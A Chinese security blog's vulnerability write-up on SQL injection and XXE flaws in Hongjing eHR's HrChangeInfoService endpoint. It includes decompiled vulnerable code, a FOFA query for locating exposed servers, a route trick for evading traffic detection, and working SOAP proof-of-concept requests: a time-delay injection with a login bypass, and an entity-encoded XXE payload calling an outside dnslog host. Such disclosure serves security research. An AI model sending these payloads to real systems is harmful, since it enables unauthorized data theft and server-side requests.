---
title: "宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞"
source: https://mrxn.net/jswz/hjsoft-HrChangeInfoService-sqli.html
asset_dir: assets/宏景人力资源管理系统-hrchangeinfoservice-sql注入漏洞+xxe漏洞
---

# 宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/17 08:19
* 1577浏览
* [0评论](#comment)
* 1小时阅读

深入探索

sql

宏

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

宏景[人力资源管理系统](#)（eHR）是一款由宏景软件研发的系统。宏景人力资源管理系统的 `HrChangeInfoService` 接口处存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经过身份认证的远程攻击者可利用此漏洞执行任意SQL指令，从而窃取数据库敏感信息。

计算机科学

# 影响版本

# fofa语法

> `app="HJSOFT-HCM"`

# 漏洞分析

深入探索

SQL

hrms

数据库

先看 `WEB-INF/web.xml` 里对于 `/services/*` 路由的处理由 `servlet-name` 为 `XFireServlet`来处理

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-001-1a27e7d7448e.webp)](https://image.mrxn.net/f743cba663974f0d8590e078ba089ecb.webp)

同时这里可以看到路由 `/servlet/XFireServlet/` 也是由 `XFireServlet` 来处理，二者均由 `XFireServlet` 来处理，那么就有两种方式来访问，对吧，利用这个差异可能绕过某些流量检测设备，对于 `/services/*` 路由下的一些[漏洞利用](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

深入探索

文件大小转换

网络安全培训

企业安全咨询

前置知识关于 `WEB-INF/classes/META-INF/xfire/services.xml` 文件的作用：

人力资源

是 XFire（一个 Java Web Service 框架）用来配置 Web Service 服务的核心配置文件。它的作用是：

* 定义和描述 Web Service 服务（如服务名、实现类、接口等）。
* 配置服务的发布、协议、端点等信息。
* 控制服务的相关参数（如拦截器、传输方式等）。

简单来说，这个文件用于告诉 XFire 框架有哪些服务、怎么暴露服务以及如何处理请求。

因此我们直接去 `WEB-INF/classes/META-INF/xfire/services.xml` 查找我们本次审计的主角 `HrChangeInfoService` 部分的定义：

```
<service  xmlns="http://xfire.codehaus.org/config/1.0">
    <name>HrChangeInfoService</name>
    <namespace>http://www.hjsj.com/HrChangeInfoService</namespace>
    <serviceClass>com.hjsj.hrms.service.core.HrChangeInfoService</serviceClass>
  </service>
```

## getChangeUsers

跟进 `HrChangeInfoService` 类，看第一个方法 `getChangeUsers` 的实现

```
public String getChangeUsers(String var1, String var2, String var3) {
        if (var2 != null && var2.length() > 0 && var3 != null && var3.length() > 0) {
            boolean var4 = this.cheakCode(var2, var3);
            if (!var4) {
                return this.returnMessLog("传入的校验用户名密码错误", 1, "");
            } else {
                String var5 = "";
                Connection var6 = null;

                String var8;
                try {
                    var6 = AdminDb.getConnection();
                    ChangeInfoInterfaces var7 = new ChangeInfoInterfaces();
                    var5 = var7.getChangeUsersXML(var6, var1);
                    return var5;
                } catch (Exception var18) {
                    var18.printStackTrace();
                    var8 = this.returnMessLog("获取人员信息错误", 1, "");
                } finally {
                    try {
                        if (var6 != null) {
                            var6.close();
                        }
                    } catch (SQLException var17) {
                    }

                }

                return var8;
            }
        } else {
            return this.returnMessLog("传入的校验用户名密码不能为空！", 1, "");
        }
    }
```

三个变量 var1、var2、var3,其中后两个进入 `cheakCode` 方法

```
private boolean cheakCode(String var1, String var2) {
        boolean var3 = false;
        Connection var4 = null;
        RowSet var5 = null;

        try {
            var4 = AdminDb.getConnection();
            String var6 = "select 1 from operuser where username='" + var1 + "' and password='" + var2 + "'";
            ContentDAO var7 = new ContentDAO(var4);
            var5 = var7.search(var6);
            if (var5.next()) {
                var3 = true;
            }
```

可以看到 var2、var3 ==> var1、var2 被直接拼接进sql语句中执行，无任何过滤和校验处理，造成[SQL注入漏](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

而 var1 会带入 `ChangeInfoInterfaces` 的 `getChangeUsersXML` 方法里

```
public String getChangeUsersXML(Connection var1, String var2) {
        StringBuffer var3 = new StringBuffer();
        var3.append("select * from " + this.emp_table + "");
        if (var2 != null && var2.length() > 0) {
            var3.append(" where flag='" + var2 + "'");
        }

        List var4 = ExecuteSQL.executeMyQuery(var3.toString());
        if (var4 == null) {
            return "";
        } else {
            var3.setLength(0);
            var3.append("select * from " + this.emp_table + " where 1=2");
            ArrayList var5 = this.getColumns(var1, var3.toString());
            String var6 = this.constructorXml(var5, var4);
            return var6;
        }
    }
```

同样被拼接进 `var3.append(" where flag='" + var2 + "'");` sql语句中，直接执行造成SQL注入漏洞。

SQL注入防护

其他几个同样存在类似的sql注入漏洞：

## getWhereChangeUsers

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-002-1b97230e082a.webp)](https://image.mrxn.net/4f2a09f459794833bd7b8f69b57a865f.webp)

## returnSynchroXml

### SQLi

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-003-d427eabff4db.webp)](https://image.mrxn.net/eb622b46955f499fa487e96a440fbd70.webp)

### XXE

其中 `returnSynchroUserXml` 方法还存在[XXE漏洞](https://mrxn.net/tag/XXE)

代码安全审计

```
public boolean returnSynchroUserXml(Connection var1, String var2) {
        boolean var3 = true;
        if (var2 != null && var2.length() > 0) {
            String var4 = "/hr/element";
            SAXBuilder var6 = new SAXBuilder();
            String var7 = "";
            String var8 = "";
            StringReader var9 = new StringReader(var2.toString());
            new ArrayList();
            StringBuffer var11 = new StringBuffer();

            try {
                this.doc = var6.build(var9);
```

使用 `SAXBuilder` 解析未经验证/过滤的用户输入 (`var2`) 时，未禁用外部实体解析。攻击者可通过恶意XML触发外部实体注入。

漏洞修复方案

## returnSynchroArray

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-004-57fe2ff1259d.webp)](https://image.mrxn.net/b6ac42f5d44b48679cb2f46c67040e1d.webp)

## returnSynchroString

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-005-010c153006da.webp)](https://image.mrxn.net/ee28404d9cee43859c9795912714f0c5.webp)

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-006-b3554a75ed95.webp)](https://image.mrxn.net/547a00d3ef3c4b52a1d0b68390bad42e.webp)

# 漏洞复现

## getChangeUsers

```
POST /servlet/XFireServlet/HrChangeInfoService HTTP/1.1
Host: hjsoft.mrxn.net
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrc="http://www.hjsj.com/HrChangeInfoService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrc:getChangeUsers>
         <hrc:changeFlag>-1'waitfor delay '0:0:5'-- </hrc:changeFlag>
         <hrc:username>1</hrc:username>
         <hrc:password>1'or '1'='1</hrc:password>
      </hrc:getChangeUsers>
   </soapenv:Body>
</soapenv:Envelope>
```

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-007-d218fe40ec5a.webp)](https://image.mrxn.net/4e894a428b684da4aaae623706317714.webp)

成功延时 5 秒

物流软件安全

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-008-a6756c9cda5e.webp)](https://image.mrxn.net/380600f999ae45fd850a12afdc24e237.webp)

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-009-72963a9539b7.webp)](https://image.mrxn.net/fd36cec09bf54143af7c1e7da944aeed.webp)

两种路由都是可以的噢！

## returnSynchroXml XXE

```
POST /services/HrChangeInfoService HTTP/1.1
Host: hjsoft.mrxn.net
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrc="http://www.hjsj.com/HrChangeInfoService">
   <soapenv:Header/>
   <soapenv:Body>
      <hrc:returnSynchroXml>
         <hrc:strString>&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x66;&#x6f;&#x6f;&#x20;&#x5b;&#x20;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x78;&#x78;&#x65;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x74;&#x65;&#x73;&#x74;&#x2e;&#x64;&#x6e;&#x73;&#x6c;&#x6f;&#x67;&#x2e;&#x70;&#x74;&#x2f;&#x78;&#x78;&#x65;&#x5f;&#x74;&#x65;&#x73;&#x74;&#x22;&#x3e;&#x20;&#x5d;&#x3e;&#x3c;&#x66;&#x6f;&#x6f;&#x3e;&#x26;&#x78;&#x78;&#x65;&#x3b;&#x3c;&#x2f;&#x66;&#x6f;&#x6f;&#x3e;</hrc:strString>
         <hrc:username>1</hrc:username>
         <hrc:password>1'or '1'='1</hrc:password>
      </hrc:returnSynchroXml>
   </soapenv:Body>
</soapenv:Envelope>
```

在DNSLOG平台成功收到DNS请求和HTTP请求

编程

[![宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](images/img-010-6129f01bd6d5.webp)](https://image.mrxn.net/9e38ea3d947c42a7a710b641f47fd0a3.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#XXE](https://mrxn.net/tag/XXE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.getChangeUsers](#toc-4-1-)
* [4.2.getWhereChangeUsers](#toc-4-2-)
* [4.3.returnSynchroXml](#toc-4-3-)
* [4.3.1.SQLi](#toc-4-3-1-)
* [4.3.2.XXE](#toc-4-3-2-)
* [4.4.returnSynchroArray](#toc-4-4-)
* [4.5.returnSynchroString](#toc-4-5-)
* [5.漏洞复现](#toc-5-)
* [5.1.getChangeUsers](#toc-5-1-)
* [5.2.returnSynchroXml XXE](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[宏景人力资源管理系统 HrChangeInfoService SQL注入漏洞+XXE漏洞](https://mrxn.net/jswz/hjsoft-HrChangeInfoService-sqli.html)  
文章链接：<https://mrxn.net/jswz/hjsoft-HrChangeInfoService-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hjsoft-HrChangeInfoService-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
